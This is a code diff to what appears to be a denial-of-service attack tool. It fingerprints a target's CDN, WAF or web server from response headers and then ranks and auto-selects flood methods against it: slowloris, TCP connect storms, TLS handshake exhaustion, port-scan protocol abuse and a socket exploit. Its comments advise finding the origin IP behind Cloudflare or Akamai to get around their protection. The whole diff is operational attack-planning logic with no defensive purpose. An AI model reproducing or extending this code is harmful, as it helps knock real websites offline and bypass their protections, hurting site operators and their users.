@@ -5,47 +5,47 @@ import aiohttp
 from datetime import datetime, timezone
 
 # Defense pattern detection rules
+# 5 methods: PSPE(port-scan protocol abuse) | TCP(connect storm) | TLS(handshake exhaust) | HTTP(L7+slowloris drip) | GAME(socket exploit)
 DEFENSE_RULES = {
     "cloudflare": {
         "detect": ["server: cloudflare", "cf-ray:", "cf-cache-status:", "__cf_bm"],
-        "recommended": ["HTTP_PROXY", "H2RAPID", "WSFLOOD"],
-        "reason": "Cloudflare proxy — use IP rotation + L7 methods that pass edge",
+        "recommended": ["HTTP", "TLS", "PSPE"],
+        "reason": "CDN: Find Origin IP first, then HTTP(slowloris drip)/TLS/PSPE on origin",
     },
     "akamai": {
         "detect": ["server: akamaighost", "akamai", "x-akamai"],
-        "recommended": ["HTTP_PROXY", "HTTP", "SLOWLORIS"],
-        "reason": "Akamai edge — L7 methods with proxy rotation",
+        "recommended": ["HTTP", "TLS", "PSPE"],
+        "reason": "CDN — origin discovery + L7 HTTPS",
     },
     "aws_waf": {
         "detect": ["x-amz-cf-id", "x-amzn-waf", "awselb"],
-        "recommended": ["HTTP_PROXY", "GRAPHQL"],
-        "reason": "AWS WAF — GraphQL abuse + proxy rotation bypass rate-limit",
+        "recommended": ["HTTP", "TLS", "PSPE"],
+        "reason": "WAF — HTTP slowloris drip + HTTPS flood",
     },
     "nginx_only": {
         "detect": ["server: nginx"],
-        "recommended": ["MEGA", "TLS_EXHAUST", "SLOWLORIS"],
-        "reason": "Nginx without CDN — TCP connection flood + slowloris effective",
+        "recommended": ["PSPE", "TLS", "TCP", "HTTP"],
+        "reason": "Nginx origin: PSPE multi-port + TLS + TCP connect storm",
     },
     "apache_only": {
         "detect": ["server: apache"],
-        "recommended": ["SLOWLORIS", "MEGA", "HTTP"],
-        "reason": "Apache — slowloris kills MaxRequestWorkers, TCP flood exhausts",
+        "recommended": ["HTTP", "PSPE", "TLS", "TCP"],
+        "reason": "Apache bare: HTTP slowloris best, then PSPE multi-port",
     },
     "no_protection": {
-        "detect": [],  # fallback if no CDN/WAF detected
-        "recommended": ["MEGA", "TLS_EXHAUST", "UDP", "SLOWLORIS"],
-        "reason": "No CDN/WAF detected — all methods viable, TCP+UDP most effective",
+        "detect": [],
+        "recommended": ["PSPE", "TCP", "TLS", "HTTP", "GAME"],
+        "reason": "No CDN — all 5 methods OK",
     },
 }
 
-# Method effectiveness score by defense type (0-10)
 METHOD_SCORES = {
-    "cloudflare": {"MEGA": 3, "TLS_EXHAUST": 3, "HTTP": 4, "SLOWLORIS": 3, "HTTP_PROXY": 8, "GAME": 2, "H2RAPID": 7, "WSFLOOD": 6, "GRAPHQL": 5, "UDP": 1},
-    "akamai":     {"MEGA": 3, "TLS_EXHAUST": 3, "HTTP": 5, "SLOWLORIS": 4, "HTTP_PROXY": 7, "GAME": 2, "H2RAPID": 5, "WSFLOOD": 5, "GRAPHQL": 4, "UDP": 1},
-    "aws_waf":    {"MEGA": 4, "TLS_EXHAUST": 3, "HTTP": 3, "SLOWLORIS": 3, "HTTP_PROXY": 7, "GAME": 2, "H2RAPID": 6, "WSFLOOD": 5, "GRAPHQL": 8, "UDP": 2},
-    "nginx_only": {"MEGA": 9, "TLS_EXHAUST": 8, "HTTP": 7, "SLOWLORIS": 9, "HTTP_PROXY": 5, "GAME": 3, "H2RAPID": 6, "WSFLOOD": 7, "GRAPHQL": 6, "UDP": 8},
-    "apache_only":{"MEGA": 8, "TLS_EXHAUST": 7, "HTTP": 6, "SLOWLORIS": 10,"HTTP_PROXY": 4, "GAME": 3, "H2RAPID": 5, "WSFLOOD": 6, "GRAPHQL": 5, "UDP": 7},
-    "no_protection":{"MEGA": 9, "TLS_EXHAUST": 8, "HTTP": 7, "SLOWLORIS": 8, "HTTP_PROXY": 5, "GAME": 3, "H2RAPID": 6, "WSFLOOD": 7, "GRAPHQL": 6, "UDP": 10},
+    "cloudflare": {"PSPE": 5, "TCP": 5, "TLS": 6, "HTTP": 8, "GAME": 2},
+    "akamai":     {"PSPE": 5, "TCP": 5, "TLS": 6, "HTTP": 8, "GAME": 2},
+    "aws_waf":    {"PSPE": 5, "TCP": 5, "TLS": 6, "HTTP": 8, "GAME": 2},
+    "nginx_only": {"PSPE": 10, "TCP": 8, "TLS": 9, "HTTP": 7, "GAME": 3},
+    "apache_only":{"PSPE": 8, "TCP": 6, "TLS": 7, "HTTP": 10, "GAME": 3},
+    "no_protection":{"PSPE": 10, "TCP": 9, "TLS": 8, "HTTP": 7, "GAME": 5},
 }
 
 
@@ -110,4 +110,4 @@ def auto_select_method(defense_type: str, available_methods: list) -> str:
         if s > best_score:
             best = m
             best_score = s
-    return best or "MEGA"
+    return best or "PSPE"
